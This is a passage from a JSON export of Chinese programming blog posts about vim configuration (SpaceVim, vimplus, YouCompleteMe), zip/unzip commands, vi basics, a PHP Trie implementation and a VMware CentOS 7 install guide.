id=\"一些问题\"><a name=\"t19\"></a>一些问题</h2>\n\n<p>XShell 下颜色显示混乱问题 <br>\n在 .SpaceVim.d/init.vim 中添加以下两句配置</p>\n\n<pre class=\"has\">\n<code>let g:spacevim_enable_guicolors = 0\nset t_Co=256</code></pre>\n\n<p> </p>\n\n<h2 id=\"相对行号问题\"><a name=\"t20\"></a>相对行号问题</h2>\n\n<p>如果有些老铁不习惯相对行号, 可以将相对行号关闭.</p>\n\n<p><img alt=\"这里写图片描述\" class=\"has\" src=\"https://img-blog.csdn.net/20180322132925643?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L2xpdWNoZW54aWE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<pre class=\"has\">\n<code>set norelativenumber</code></pre>\n\n<p> </p>\n\n<h2 id=\"其他\"><a name=\"t21\"></a>其他</h2>\n\n<p>由于 SpaceVim 的作者主要是写 Java 的. 个人感觉 SpaceVim 写 C++ 的感觉比较一般吧. 最主要是因为 SpaceVim 使用 deoplete 代替 YouCompleteMe 作为代码补全插件. 而后者目前对于 C++ 相关的代码补全更强一些.</p>\n\n<h1 id=\"vim高配版2-vimplus\"><a name=\"t22\"></a>vim高配版(2) – vimplus</h1>\n\n<h2 id=\"简介-2\"><a name=\"t23\"></a>简介</h2>\n\n<p>vimplus是国内的又一个大佬打造的一个vim开发工具包. 为 cpp 开发者量身定做. 界面漂亮.</p>\n\n<h2 id=\"官网参见github\"><a name=\"t24\"></a>官网参见github</h2>\n\n<p><a href=\"https://github.com/chxuan/vimplus\">https://github.com/chxuan/vimplus</a></p>\n\n<h2 id=\"折腾程度-2\"><a name=\"t25\"></a>折腾程度</h2>\n\n<p>安装过程: 4星</p>\n\n<h2 id=\"安装过程-1\"><a name=\"t26\"></a>安装过程</h2>\n\n<p>可以参考github上的文档</p>\n\n<pre class=\"has\">\n<code>git clone https://github.com/chxuan/vimplus.git ~/.vimplus\ncd ~/.vimplus\n./install.sh</code></pre>\n\n<p> </p>\n\n<p>由于 vimplus 内置了 YouCompleteMe, 并且会自动进行编译, 省了不少心. 安装过程比较久, 请耐心等待. 但是仍然不能保证100%安装成功. 如果安装失败, 请自行百度. <br><img alt=\"这里写图片描述\" class=\"has\" src=\"https://img-blog.csdn.net/20180322133324334?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L2xpdWNoZW54aWE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<h2 id=\"使用方法-2\"><a name=\"t27\"></a>使用方法</h2>\n\n<p>官方github上有详细说明. 比spacevim简洁了不少.</p>\n\n<h1 id=\"vim作死版-尝试手动安装-youcompleteme\"><a name=\"t28\"></a>vim作死版 – 尝试手动安装 YouCompleteMe</h1>\n\n<h2 id=\"简介-3\"><a name=\"t29\"></a>简介</h2>\n\n<p>YCM是vim史上最NB插件, 没有之一. 同时也是史上最难安装的插件, 也没有之一.</p>\n\n<p>具备以下非常屌炸天的功能</p>\n\n<p>精准的语义补全 <br>\n客户端服务器异步IO架构, 非常高的性能以及非常流畅的用户体验. <br>\n语法检查 <br>\n模糊匹配 <br>\n跳转到声明/定义 <br>\n进入 include 的头文件 <br>\n支持很多其他的主流编程语言(不过C++支持的最好)</p>\n\n<h2 id=\"软件依赖-1\"><a name=\"t30\"></a>软件依赖</h2>\n\n<p>vim8.0或者neovim 0.2.0</p>\n\n<p>只支持x86_64系统.</p>\n\n<h2 id=\"折腾程度-3\"><a name=\"t31\"></a>折腾程度</h2>\n\n<p>安装过程: 9星</p>\n\n<p>当前网络上的大部分 YCM 安装的博客, 按照上面的步骤操作 “十有八九” 都不会成功.</p>\n\n<p>要想手动安装成功, 必须有很大的耐心, 最准确最权威的资料就是读 github 上的官方文档, 以及遇到问题的时候使用 google(不要用baidu).</p>\n\n<p>安装难点主要在这几个方面:</p>\n\n<p>vim版本限制. 需要升级vim. 最好是vim8.0或者neovim <br>\ngcc版本限制. 需要升级gcc. <br>\n编译ycm_core. 这个是补全cpp代码的核心模块. 编译过程中可能会出现很多问题. 尤其是依赖的编译工具缺失. 如果遇到问题, 仔细阅读错误日志, 并且google(不要用baidu) <br>\n.ycm_extra_conf.py 的配置. 需要对其中的内容进行一定的修改和调整. 需要理解c++编译器的一些基本知识. <br>\n安装完毕后, 不能补全代码: 需要使用 :YcmDebugInfo 指令, 找到对应的错误日志文件. 然后根据错误日志中的信息, 结合google和YCM源码分析解决. 这个只能见招拆招.</p>\n\n<p>所以建议还是使用 vimplus 能够帮助我们解决一部分问题.</p>\n                                    </div>", "log_PostTime": 1584891116, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "实用的Linux 安装 zip unzip", "log_Intro": "实用的Linux 安装 zip unzip", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>Linux 安装 zip unzip </h1>\n\n<p>1.apt-get 安装</p>\n\n<p>apt-get install zip</p>\n\n<p>2.yum 安装</p>\n\n<p>yum install -y unzip zip</p>\n\n<h2>命令实例 </h2>\n\n<p>1、把/home目录下面的mydata目录压缩为mydata.zip</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>cd /home    #进入/home目录<br>\n\t\t\tzip -r mydata.zip mydata    #压缩mydata目录</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>2、把/home目录下面的mydata.zip解压到mydatabak目录里面</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>unzip mydata.zip -d mydatabak</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>3、把/home目录下面的abc文件夹和123.txt压缩成为abc123.zip</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>zip -r abc123.zip abc 123.txt</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>4、把/home目录下面的wwwroot.zip直接解压到/home目录里面</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>unzip wwwroot.zip</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>5、把/home目录下面的abc12.zip、abc23.zip、abc34.zip同时解压到/home目录里面</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>unzip abc\\*.zip</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>6、查看把/home目录下面的wwwroot.zip里面的内容</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>unzip -v wwwroot.zip</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>7、验证/home目录下面的wwwroot.zip是否完整</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>unzip -t wwwroot.zip</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>8、把/home目录下面wwwroot.zip里面的所有文件解压到第一级目录</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>unzip -j wwwroot.zip</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>当unzip解压文件失败还可以使用以下方法</p>\n\n<p>yum -y install java-1.6.0-openjdk-devel</p>\n\n<p>jar xvf v2.3.0.zip</p>\n                                    </div>", "log_PostTime": 1584891118, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "vim的简单介绍与使用", "log_Intro": "vim的简单介绍与使用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>1、vi的基本概念<br>\n　　基本上vi可以分为三种状态，分别是命令模式（command mode）、插入模式（Insert<br>\nmode）和底行模式（last line mode），各模式的功能区分如下：<br><br>\n1) 命令行模式command mode）<br><br>\n　　控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，<br>\n或者到 last line mode。<br><br>\n2) 插入模式（Insert mode）<br><br>\n　　只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。<br><br>\n3) 底行模式（last line mode）<br><br>\n　　将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。<br><br>\n不过一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入<br>\n命令行模式command mode）。<br><br>\n2、vi的基本操作<br>\na) 进入vi<br><br>\n　　在系统提示符号输入vi及文件名称后，就进入vi全屏幕编辑画面：<br><br>\n　　　$ vi myfile<br><br><br>\n　　不过有一点要特别注意，就是您进入vi之后，是处于「命令行模式（command mode）<br>\n」，您要切换到「插入模式（Insert mode）」才能够输入文字。初次使用vi的人都会想先<br>\n用上下左右键移动光标，结果电脑一直哔哔叫，把自己气个半死，所以进入vi后，先不要<br>\n乱动，转换到「插入模式（Insert mode）」再说吧！<br><br>\nb) 切换至插入模式（Insert mode）编辑文件<br><br>\n　　在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Ins<br>\nert mode）」，这时候你就可以开始输入文字了。<br><br>\nc) Insert 的切换<br><br>\n　　您目前处于「插入模式（Insert mode）」，您就只能一直输入文字，如果您发现输错<br>\n了字！想用光标键往回移动，将该字删除，就要先按一下「ESC」键转到「命令行模式（c<br>\nommand mode）」再删除文字。<br><br>\nd) 退出vi及保存文件<br><br>\n　　在「命令行模式（command mode）」下，按一下「：」冒号键进入「Last line mode<br>\n」，例如：<br><br>\n: w filename （输入 「w filename」将文章以指定的文件名filename保存）<br><br>\n: wq (输入「wq」，存盘并退出vi)<br><br>\n: q! (输入q!， 不存盘强制退出vi)<br><br><br>\n3、命令行模式（command mode）功能键<br>\n1）. 插入模式<br><br>\n　　按「i」切换进入插入模式「insert mode」，按“i”进入插入模式后是从光标当前位<br>\n置开始输入文件；<br><br>\n　　按「a」进入插入模式后，是从目前光标所在位置的下一个位置开始输入文字；<br><br>\n　　按「o」进入插入模式后，是插入新的一行，从行首开始输入文字。<br><br>\n2）. 从插入模式切换为命令行模式<br><br>\n　　按「ESC」键。<br><br>\n3）. 移动光标<br><br>\n　　vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「<br>\nj」、「k」、「l」，分别控制光标左、下、上、右移一格。<br><br>\n　　按「ctrl」+「b」：屏幕往“后”移动一页。<br><br>\n　　按「ctrl」+「f」：屏幕往“前”移动一页。<br><br>\n　　按「ctrl」+「u」：屏幕往“后”移动半页。<br><br>\n　　按「ctrl」+「d」：屏幕往“前”移动半页。<br><br>\n　　按数字「0」：移到文章的开头。<br><br>\n　　按「G」：移动到文章的最后。<br><br>\n　　按「$」：移动到光标所在行的“行尾”。<br><br>\n　　按「^」：移动到光标所在行的“行首”<br><br>\n　　按「w」：光标跳到下个字的开头<br><br>\n　　按「e」：光标跳到下个字的字尾<br><br>\n　　按「b」：光标回到上个字的开头<br><br>\n　　按「#l」：光标移到该行的第#个位置，如：5l,56l。<br><br>\n4）. 删除文字<br><br>\n　　「x」：每按一次，删除光标所在位置的“后面”一个字符。<br><br>\n　　「#x」：例如，「6x」表示删除光标所在位置的“后面”6个字符。<br><br>\n　　「X」：大写的X，每按一次，删除光标所在位置的“前面”一个字符。<br><br>\n　　「#X」：例如，「20X」表示删除光标所在位置的“前面”20个字符。<br><br>\n　　「dd」：删除光标所在行。<br><br>\n　　「#dd」：从光标所在行开始删除#行<br><br>\n5）. 复制<br><br>\n　　「yw」：将光标所在之处到字尾的字符复制到缓冲区中。<br><br>\n　　「#yw」：复制#个字到缓冲区<br><br>\n　　「yy」：复制光标所在行到缓冲区。<br><br>\n　　「#yy」：例如，「6yy」表示拷贝从光标所在的该行“往下数”6行文字。<br><br>\n　　「p」：将缓冲区内的字符贴到光标所在位置。注意：所有与“y”有关的复制命令都<br>\n必须与“p”配合才能完成复制与粘贴功能。<br><br>\n6）. 替换<br><br>\n　　「r」：替换光标所在处的字符。<br><br>\n　　「R」：替换光标所到之处的字符，直到按下「ESC」键为止。<br><br>\n7）. 回复上一次操作<br><br>\n　　「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个<a href=\"http://www.jb51.net/\" rel=\"nofollow\">操作</a>。按多次“u”<br>\n可以执行多次回复。<br><br>\n8）. 更改<br><br>\n　　「cw」：更改光标所在处的字到字尾处<br><br>\n　　「c#w」：例如，「c3w」表示更改3个字<br><br>\n9）. 跳至指定的行<br><br>\n　　「ctrl」+「g」列出光标所在行的行号。<br><br>\n　　「#G」：例如，「15G」，表示移动光标至文章的第15行行首。<br><br>\n4、Last line mode下命令简介<br>\n　　在使用「last line mode」之前，请记住先按「ESC」键确定您已经处于「command m<br>\node」下后，再按「：」冒号即可进入「last line mode」。<br><br>\nA) 列出行号<br><br>\n　「set nu」：输入「set nu」后，会在文件中的每一行前面列出行号。<br><br>\nB) 跳到文件中的某一行<br><br>\n　「#」：「#」号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，<br>\n如输入数字15，再回车，就会跳到文章的第15行。<br><br>\nC) 查找字符<br><br>\n　「/关键字」：先按「/」键，再输入您想寻找的字符，如果第一次找的关键字不是您想<br>\n要的，可以一直按「n」会往后寻找到您要的关键字为止。<br><br>\n　「?关键字」：先按「?」键，再输入您想寻找的字符，如果第一次找的关键字不是您想<br>\n要的，可以一直按「n」会往前寻找到您要的关键字为止。<br><br>\nD) 保存文件<br><br>\n　「w」：在冒号输入字母「w」就可以将文件保存起来。<br><br>\nE) 离开vi<br><br>\n　「q」：按「q」就是退出，如果无法离开vi，可以在「q」后跟一个「!」强制离开vi。<br><br><br>\n　「qw」：一般建议离开时，搭配「w」一起使用，这样在退出的时候还可以保存文件。<br><br><br>\n5、vi命令列表<br>\n1、下表列出命令模式下的一些键的功能：<br><br>\nh<br>\n左移光标一个字符<br><br>\nl<br>\n右移光标一个字符<br><br>\nk<br>\n光标上移一行<br><br>\nj<br>\n光标下移一行<br><br>\n^<br>\n光标移动至行首<br><br>\n0<br>\n数字“0”，光标移至文章的开头<br><br>\nG<br>\n光标移至文章的最后<br><br>\n$<br>\n光标移动至行尾<br><br>\nCtrl+f<br>\n向前翻屏<br><br>\nCtrl+b<br>\n向后翻屏<br><br>\nCtrl+d<br>\n向前翻半屏<br><br>\nCtrl+u<br>\n向后翻半屏<br><br>\ni<br>\n在光标位置前插入字符<br><br>\na<br>\n在光标所在位置的后一个字符开始增加<br><br>\no<br>\n插入新的一行，从行首开始输入<br><br>\nESC<br>\n从输入状态退至命令状态<br><br>\nx<br>\n删除光标后面的字符<br><br>\n#x<br>\n删除光标后的＃个字符<br><br>\nX<br>\n(大写X)，删除光标前面的字符<br><br>\n#X<br>\n删除光标前面的#个字符<br><br>\ndd<br>\n删除光标所在的行<br><br>\n#dd<br>\n删除从光标所在行数的#行<br><br>\nyw<br>\n复制光标所在位置的一个字<br><br>\n#yw<br>\n复制光标所在位置的#个字<br><br>\nyy<br>\n复制光标所在位置的一行<br><br>\n#yy<br>\n复制从光标所在行数的#行<br><br>\np<br>\n粘贴<br><br>\nu<br>\n取消操作<br><br>\ncw<br>\n更改光标所在位置的一个字<br><br>\n#cw<br>\n更改光标所在位置的#个字<br><br><br>\n2、下表列出行命令模式下的一些指令<br>\nw filename<br>\n储存正在编辑的文件为filename<br><br>\nwq filename<br>\n储存正在编辑的文件为filename，并退出vi<br><br>\nq!<br>\n放弃所有修改，退出vi<br><br>\nset nu<br>\n显示行号<br><br>\n/或?<br>\n查找，在/后输入要查找的内容<br><br>\nn<br>\n与/或?一起使用，如果查找的内容不是想要找的关键字，按n或向后（与/联用）或向前（<br>\n与?联用）继续查找，直到找到为止。<br><br><br>\n对于第一次用vi，有几点注意要提醒一下：<br>\n1、用vi打开文件后，是处于「命令行模式（command mode）」，您要切换到「插入模式（<br>\nInsert mode）」才能够输入文字。切换方法：在「命令行模式（command mode）」下按一<br>\n下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了<br>\n。<br>\n2、编辑好后，需从插入模式切换为命令行模式才能对文件进行保存，切换方法：按「ESC<br>\n」键。<br>\n3、保存并退出文件：在命令模式下输入:wq即可！（别忘了wq前面的:）</p>\n                                    </div>", "log_PostTime": 1584891119, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP-Trie树应用", "log_Intro": "PHP-Trie树应用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1> </h1>\n\n<h1>一、Trie树简介</h1>\n\n<h3>什么是Trie树？  </h3>\n\n<p>Trie树，即字典树，又称单词查找树或键树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较，查询效率比哈希表高。   Trie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。</p>\n\n<h3>Trie树基本性质：  </h3>\n\n<p>1、根节点不包含字符，除根节点外每一个节点都只包含一个字符。   2、从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。   3、每个节点的所有子节点包含的字符都不相同。</p>\n\n<h1>二、Trie树操作</h1>\n\n<h3>插入操作示例:</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">class TTrie\n{\n    private $dict = [[]]; //字典\n    private $input = 0; //字符串当前偏移\n    private $backtracking = 0; //字符串回溯位置\n    private $buffer = [];\n\n    public function __construct($words)\n    {\n        $this-&gt;insert($words);\n    }\n\n    /**\n     * 插入单词\n     * Function insert\n     * @Author sakmon\n     * @CreateTime 2019/4/25 15:42\n     * @param $word\n     */\n    public function insert($word)\n    {\n        if (is_array($word)) {\n            foreach ($word as $v) {\n                $this-&gt;insert($v);\n            }\n            return;\n        }\n        $p = count($this-&gt;dict);\n        $cur = 0; //当前节点号\n        foreach (str_split($word) as $c) {\n            if (isset($this-&gt;dict[$cur][$c])) { //已存在就下移 , 相同前缀单词同一个节点\n                $cur = $this-&gt;dict[$cur][$c];\n                continue;\n            }\n            $this-&gt;dict[$p] = []; //创建新节点\n            $this-&gt;dict[$cur][$c] = $p; //在父节点记录子节点号\n            $cur = $p; //把当前节点设为新插入的\n            $p++;\n        }\n        $this-&gt;dict[$cur]['isWord'] = true; //一个词结束，标记叶子节点\n    }\n}\n</code></pre>\n\n<h3>字典树生成示例：</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">$trie = new TTrie();\n$words = [‘abd’, ‘abc’, ‘bd’, ‘dd’, ‘dda’]; \nforeach ($words as $word) {\n    $trie-&gt;insert($word);\n}\n</code></pre>\n\n<h3><img alt=\"\" class=\"has\" height=\"419\" src=\"https://img-blog.csdnimg.cn/20190519105843998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"513\"></h3>\n\n<h3>单词查找示例：</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">    /**\n     * 单词查找\n     * Function find\n     * @Author sakmon\n     * @CreateTime 2019/4/25 17:24\n     * @param $word\n     * @return bool\n     */\n    public function find($word)\n    {\n        $len = strlen($word);\n        $p = 0;\n        for ($i = 0; $i &lt; $len; $i++) {\n            $c = $word{$i};\n            if (!isset($this-&gt;dict[$p][$c])) { //节点不存在\n                return false;\n            }\n            $p = $this-&gt;dict[$p][$c]; //子节点\n        }\n        if (!isset($this-&gt;dict[$p]['isWord'])) {  //判断是否为单词，避免相同前缀\n            return false;\n        }\n        return true;\n    }</code></pre>\n\n<h3>删除单词:</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">    /**\n     * Function remove\n     * @Author sakmon\n     * @CreateTime 2019/4/26 11:54\n     * @param $word\n     */\n    public function remove($word)\n    {\n        if (!$this-&gt;find($word)) { //先判断单词是否存在\n            return false;\n        }\n        $len = strlen($word);\n        $p = 0;\n        $del = []; //需删除的相关联键\n        for ($i = 0; $i &lt; $len; $i++) {\n            $c = $word{$i};\n            $cur = $this-&gt;dict[$p][$c]; //子节点\n            if (count($this-&gt;dict[$cur]) == 1) {\n                $del[] = [$p, $c];\n            } else {\n                $del = [];\n            }\n            $p = $cur; //子节点\n        }\n        foreach ($del as $key =&gt; $val) {\n            unset($this-&gt;dict[$val[0]][$val[1]]);\n        }\n        if (count($this-&gt;dict[$p]) == 1) { //判断叶子是否只有一个元素，即isWord\n            unset($this-&gt;dict[$p]);\n        } else {\n            unset($this-&gt;dict[$p]['isWord']);\n        }\n        return true;\n    }</code></pre>\n\n<h1>三、Trie树应用</h1>\n\n<pre class=\"has\">\n<code class=\"language-php\">/**\n     * Function match\n     * @Author sakmon\n     * @CreateTime 2019/4/25 18:03\n     * @param $s\n     * @return array\n     */\n    public function match($s)\n    {\n        $cur = 0; //当前节点，初始为根节点\n        $i =&amp; $this-&gt;input; //字符串当前偏移\n        $p =&amp; $this-&gt;backtracking; //字符串回溯位置\n        $len = strlen($s);\n        $dl = 0;\n        while ($i &lt; $len) {\n            $c = $s{$i};\n            if (isset($this-&gt;dict[$cur][$c])) { //如果存在\n                $cur = $this-&gt;dict[$cur][$c]; //转到对应的位置\n                if (isset($this-&gt;dict[$cur]['isWord'])) { //是叶子节点，单词匹配！\n                    $dl = $i - $p + 1; //最长匹配单词长度\n                }\n                if (isset($this-&gt;dict[$cur][$s[$i + 1]])) {//检查下一个字符是否也能匹配，长度优先\n                    $i++;\n                    continue;\n                }\n                if ($dl &gt; 0) { //匹配单词成功\n                    $this-&gt;buffer[] = substr($s, $p, $dl); //取出匹配位置和匹配的词\n                    $i = $p + $dl - 1;\n                    $p = $i + 1;\n                    $dl = 0;\n                } else {\n                    $p = $i + 1; //设置下一个回溯位置\n                }\n                $cur = 0; //重置当前节点为根节点\n            } else { //不匹配\n                $cur = 0; //重置当前节点为根节点\n                $i = $p; //把当前偏移设为回溯位置\n                $p = $i + 1; //设置下一个回溯位置\n            }\n            $i++; //下一个字符\n        }\n        return $this-&gt;buffer;\n    }</code></pre>\n\n<h3>字符串检索示例 :</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">include_once('keywords.php');\n$words = array_column($keywords , 'word');\n$trie = new TTrie($words);\n//$matches = $trie-&gt;match('近年来，厦门聚焦发展电子信息、装备制造等五大产业集群，重点打造平板显示、半导体和华秋集成电路等12条千亿产业链，日前厦门发改委发布其招商地图及投资机会清单，对华强半导体与集成电路领域作出招商引资规划。');\n$matches = $trie-&gt;match('\n5G究竟会给全球带来怎样的影响力？为何号称全球第一的美国屡屡对一中国企业处处压制，而不惜采用各种手段抹黑且极力阻止其开拓市场。这些行为对华为后面有何影响，勇敢的华为会否赢得5G跑道的比赛？\n重大事件回顾\n \n去年12月，加拿大当局逮捕了华为首席财务官孟晚舟，以便向美国政府提出引渡请求。美国政府声称该公司通过隐瞒伊朗支付违反对该国的制裁来欺骗几家银行。\n \n今年1月，司法部宣布对该公司的两个部门提出一系列指控，包括窃取T-Mobile USA的商业机密。同时，美国特朗普政府通过2019年的国防授权法禁止华为和中兴参与美国政府的大部分项目合作。\n \n5月2日~3日，以美国特朗普政府为首，加拿大、澳大利亚、以色列、部分欧盟成员国（德国、法国、英国等）以及日本和韩国等30个国家在布拉格举行5G网络安全协议，并发布名为“布拉格提议”的声明。其中意味不言而喻，剑指中国华为。\n \n5月15日，美国特朗普签署行政命令。其内容用意一句话来概括就是将华为列入黑名单，禁止其电信设备进入美国市场。该文件发布后，又将华为旗下70个子公司列入美国贸易黑名单。\n \n华为为何受“照顾”\n \n5g技术的重要性不言而喻，它将为我们社会带来全新的繁荣。它将促发各行各业许多新的东西，如远程医疗、自动驾驶、智慧城市、智慧工业等，以及赋予我们身边很多最基础的设施，如配电。这将使得它会成为我们生活中非常重要的一个部分。\n \n然而，5G技术的竞争已经在进行中，而华为公司已经处于全球领先的地位。这一点或许是美国害怕和担心的。害怕的是一旦使用外国网络设备导致未来一些不可控因素的发生；担心的是5G领域已经落后于中国，美国全球5G影响力地位下降。\n \n而这些所谓的“害怕”，华为已经多次强调并解释。过去三十年，华为一直保持良好的网络安全记录。去年年底华为追加投入20亿美元的初始专项预算升级网络系统软件。\n \n但挥不去地总不是这些阴影，而是背后的“阴谋”。最近，美国官员一直以“网络安全”为由，禁止华为与美国政府签订合同，并敦促美国盟友也效仿。但是至今为止除了澳大利亚和日本以外，他们遭到了许多海外盟友的怀疑。\n \n正如今天许多媒体报道的那样，美国特朗普政府15日再次挥舞权利的大棒意图遏制华为。不管是去年12月的孟晚舟被羁押事件，还是周三特朗普签署的行政命令，其意图已相当明显。\n \n外界认为，不管是华为、爱立信，诺基亚和三星......，无论美国选择谁？都不该将政治权利导入商业竞争。\n \n对华为影响如何？\n \n然而，更大的担忧可能是美国将华为列入美国商务部工业和安全局（BIS）所谓的实体名单。这意味着美国公司需要获得相关许可才能向华为出售或转让技术。而华为依赖英特尔和高通等美国公司的部分组件来生产智能手机和笔记本电脑。\n \n此外，华为的消费者业务现在是收入最大的部门，占其总营收48.4%，被视为该公司的主要成长动能。对消费者群体的任何干扰都可能影响其整体业务。\n \n但在过去几年中，华为一直在为其智能手机设计自己的芯片，以减少对其他公司的依赖。它有一系列称为Kirin的处理器和Balong 5000的调制解调器，搭载这些产品的设备将被允许连接到5G网络。\n \n据IDC数据显示，在2018年，73％的华为智能手机包含了该公司自己的芯片。另外10％来自台湾的联发科技公司。剩下的17％来自高通公司，但这些主要是针对低端200美元以下的手机。\n \n据笔者观察，如果美国特朗普政府铁心不与华为合作5G，在失去美国5G市场的同时，如果BIS有选择性的限制华为与美国企业合作，对华为ICT基础设施和部分智能终端设备的部件供货将会产生一定影响。\n \n尽管如此，我们也有必要强调，美国只是世界的一部分。华为5G不会因为西方变黑，而东方不闪耀。\n');\nprint_r($matches);\nexit;</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891120, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "VMware14安装CentOS7的详细教程", "log_Intro": "VMware14安装CentOS7的详细教程", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>本篇文章主要介绍了VMware安装Centos7超详细过程（图文），具有一定的参考价值，感兴趣的小伙伴们可以参考一下</p>\n\n<p><strong>1.软硬件准备</strong></p>\n\n<p>软件：推荐使用VMwear，我用的是VMwear 12</p>\n\n<p>镜像：CentOS7 ,如果没有镜像可以在官网下载 ：<a href=\"http://isoredirect.centos.org/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-1804.iso\" rel=\"nofollow\">http://isoredirect.centos.org/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-1804.iso</a></p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223703824?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>硬件：因为是在宿主机上运行虚拟化软件安装centos，所以对宿主机的配置有一定的要求。最起码I5CPU双核、硬盘500G、内存4G以上。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223715242?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p><strong>2.虚拟机准备</strong></p>\n\n<p>1.打开VMwear选择新建虚拟机</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223726365?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>2.典型安装与自定义安装</p>\n\n<p>典型安装：VMwear会将主流的配置应用在虚拟机的操作系统上，对于新手来很友好。</p>\n\n<p>自定义安装：自定义安装可以针对性的把一些资源加强，把不需要的资源移除。避免资源的浪费。</p>\n\n<p>这里我选择自定义安装。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710574729.jpg\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223827626?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>3.虚拟机兼容性选择</p>\n\n<p>这里要注意兼容性，如果是VMwear12创建的虚拟机复制到VM11、10或者更低的版本会出现一不兼容的现象。如果是用VMwear10创建的虚拟机在VMwear12中打开则不会出现兼容性问题。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710574730.jpg\"><img alt=\"\" class=\"has\" 